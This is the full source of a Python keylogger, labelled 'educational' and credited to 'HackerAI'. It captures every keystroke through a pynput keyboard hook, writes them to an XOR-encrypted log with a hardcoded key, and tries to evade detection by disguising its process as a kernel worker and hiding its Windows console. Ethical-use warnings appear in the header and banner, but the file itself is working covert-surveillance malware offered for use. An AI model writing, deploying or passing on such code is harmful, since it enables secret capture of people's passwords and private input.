#!/usr/bin/env python3
"""
Project #4: Keylogger (Educational - Ethical Use Only)
Author: HackerAI
Purpose: Authorized penetration testing & security assessment training

=== ETHICAL WARNING ===
This tool is for EDUCATIONAL and AUTHORIZED TESTING purposes ONLY.
Use only on systems you OWN or have EXPLICIT WRITTEN PERMISSION to test.
Unauthorized use is illegal and unethical.
=======================

Features:
  - XOR-encrypted local log file
  - Low-level keyboard hook via pynput
  - Anti-detection: spoofed process name (/proc/self/comm)
  - F9 to stop logging gracefully
  - Silent background execution (console hidden on Windows)
"""

import os
import sys
import time
import ctypes

# ---------------------------------------------------------------------------
# 1. Anti-detection: spoof process name
# ---------------------------------------------------------------------------
def spoof_process_name(new_name: str = "[kworker/0:0]") -> None:
    """
    Overwrite the process name visible in `ps aux`, `/proc/self/comm`,
    and `/proc/self/cmdline`.  A generic kernel worker name blends in.
    """
    try:
        # Linux: write directly to /proc/self/comm (max 15 chars + null)
        with open("/proc/self/comm", "w") as f:
            f.write(new_name[:15])
    except Exception:
        pass  # non-fatal

    # Windows: rename console window title (cosmetic anti-analysis)
    if os.name == "nt":
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(new_name)
        except Exception:
            pass


# ---------------------------------------------------------------------------
# 2. XOR Encryption (symmetric)
# ---------------------------------------------------------------------------
XOR_KEY = b"K3yL0gg3r#2024!X0R"

def xor_encrypt(data: bytes) -> bytes:
    """XOR cipher with repeating key.  Symmetric: encrypt == decrypt."""
    return bytes(data[i] ^ XOR_KEY[i % len(XOR_KEY)] for i in range(len(data)))

def xor_decrypt(data: bytes) -> bytes:
    return xor_encrypt(data)  # symmetric


# ---------------------------------------------------------------------------
# 3. Log file
# ---------------------------------------------------------------------------
LOG_FILE = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "keystrokes.enc"
)


def write_encrypted(plaintext: str) -> None:
    """Append XOR-encrypted line to log file."""
    encrypted_line = xor_encrypt(plaintext.encode("utf-8"))
    with open(LOG_FILE, "ab") as f:
        f.write(encrypted_line + b"\n")


# ---------------------------------------------------------------------------
# 4. Keylogger core (pynput)
# ---------------------------------------------------------------------------
from pynput import keyboard

STOP_KEY = keyboard.Key.f9
_stop_flag = False


def on_press(key) -> bool | None:
    global _stop_flag
    if _stop_flag:
        return False

    try:
        char = key.char
        if char is not None:
            write_encrypted(char)
        else:
            # Map special keys to readable tokens
            special = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "\t",
                keyboard.Key.backspace: "<BKSP>",
                keyboard.Key.delete: "<DEL>",
                keyboard.Key.esc: "<ESC>",
                keyboard.Key.shift: "<SHIFT>",
                keyboard.Key.shift_l: "<SHIFT>",
                keyboard.Key.shift_r: "<SHIFT>",
                keyboard.Key.ctrl: "<CTRL>",
                keyboard.Key.ctrl_l: "<CTRL>",
                keyboard.Key.ctrl_r: "<CTRL>",
                keyboard.Key.alt: "<ALT>",
                keyboard.Key.alt_l: "<ALT>",
                keyboard.Key.alt_r: "<ALT>",
                keyboard.Key.caps_lock: "<CAPS>",
                keyboard.Key.cmd: "<WIN>",
                keyboard.Key.up: "<UP>",
                keyboard.Key.down: "<DOWN>",
                keyboard.Key.left: "<LEFT>",
                keyboard.Key.right: "<RIGHT>",
                keyboard.Key.home: "<HOME>",
                keyboard.Key.end: "<END>",
                keyboard.Key.page_up: "<PGUP>",
                keyboard.Key.page_down: "<PGDN>",
                keyboard.Key.insert: "<INS>",
            }
            mapped = special.get(key, f"<{key.name.upper()}>")
            write_encrypted(mapped)
    except AttributeError:
        write_encrypted(f"<?:{key}>")

    return True


def on_release(key) -> bool | None:
    global _stop_flag
    if key == STOP_KEY:
        _stop_flag = True
        write_encrypted("\n[LOG STOPPED VIA F9]\n")
        return False
    return True


# ---------------------------------------------------------------------------
# 5. Decryption helper
# ---------------------------------------------------------------------------
def decrypt_log(filepath: str = LOG_FILE) -> str | None:
    """Read and decrypt the entire .enc log into plaintext."""
    if not os.path.exists(filepath):
        print(f"[!] Log file not found: {filepath}")
        return None
    with open(filepath, "rb") as f:
        encrypted_blob = f.read()
    decrypted = xor_decrypt(encrypted_blob).decode("utf-8", errors="replace")
    # Strip per-line newline markers for clean output
    return decrypted.replace("\n\n", "\n").strip()


# ---------------------------------------------------------------------------
# 6. Console-hide (Windows)
# ---------------------------------------------------------------------------
def hide_console() -> None:
    if os.name == "nt":
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
        except Exception:
            pass


# ---------------------------------------------------------------------------
# 7. Entry point
# ---------------------------------------------------------------------------
def main() -> None:
    banner = """
==============================================================================
  PROJECT #4: KEYLOGGER (EDUCATIONAL - ETHICAL USE ONLY)
==============================================================================
  WARNING: This tool intercepts ALL keyboard input on this session.  Use
  ONLY on systems you own or have EXPLICIT WRITTEN AUTHORIZATION to test.
  Unauthorized use violates computer-fraud laws worldwide.

  By proceeding you confirm you are AUTHORISED to test this system.
==============================================================================
  STOP CONDITION : Press F9 to stop logging gracefully.
  LOG FILE       : keystrokes.enc (XOR-encrypted with rotating key)
  ANTI-DETECTION : Process name spoofed to blend as kernel worker
==============================================================================
"""
    print(banner)
    print("[*] Starting keylogger in 3 seconds ...  Press F9 to stop.\n")
    time.sleep(3)

    # Anti-detection: rename this process before hooking keyboard
    spoof_process_name("[kworker/0:0]")

    # Windows: hide the console window for silent operation
    hide_console()

    # Install the keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Post-stop summary
    print(f"\n[*] Keylogger stopped.  Encrypted log: {LOG_FILE}")
    print("[*] Decrypting for verification ...\n")

    plain = decrypt_log()
    if plain:
        print("=== DECRYPTED LOG OUTPUT ===")
        print(plain)
        print("=============================")
    else:
        print("[!] Decryption failed or log is empty.")


# ---------------------------------------------------------------------------
# 8. Standalone decryption (when invoked as: python project4_keylogger.py --decrypt)
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] in ("--decrypt", "-d"):
        plain = decrypt_log(sys.argv[2] if len(sys.argv) > 2 else LOG_FILE)
        if plain:
            print(plain)
    else:
        main()